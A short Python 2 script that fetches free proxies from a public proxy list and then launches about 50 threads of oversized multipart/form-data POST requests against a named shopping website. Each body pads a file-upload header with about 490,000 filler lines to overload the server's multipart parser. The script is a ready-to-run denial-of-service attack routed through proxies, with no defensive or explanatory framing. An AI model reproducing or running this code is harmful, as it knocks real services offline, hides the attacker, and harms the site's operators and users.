#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import requests
from threading import Thread
from proxy import Proxy

def get_proxies():
    proxy_url = "http://www.xicidaili.com/nt/"      #代理来源
    target_url = "http://www.itjuzi.com/company/1"  #验证代理的url
    ver_keyword = "com_id"                          #验证关键字
    timeout = 10                                    #验证超时时间

    p = Proxy(proxy_url, target_url, ver_keyword, timeout)
    proxies = p.get()
    return proxies

class pusher():
    def __init__(self, url, proxies):
        self.url = url
        self.body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"
        self.headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
                'Accept-Encoding':'gzip, deflate',
                'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'}
        self.proxies = proxies

    def push(self):
        loop_a = 490000
        body = self.body + "a\n"*loop_a + "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
        try:
            requests.post(self.url, proxies=self.proxies, headers=self.headers, data=body)
        except Exception:
            print '请求失败'

if __name__=="__main__":
    url = "http://www.djxmall.com"
    thread_count = 50
    proxies = get_proxies()

    p = pusher(url, proxies)
    for thread_num in range(1, thread_count):
        print "Thread [%s] starting..." %(thread_num)
        Thread(target = p.push).start()
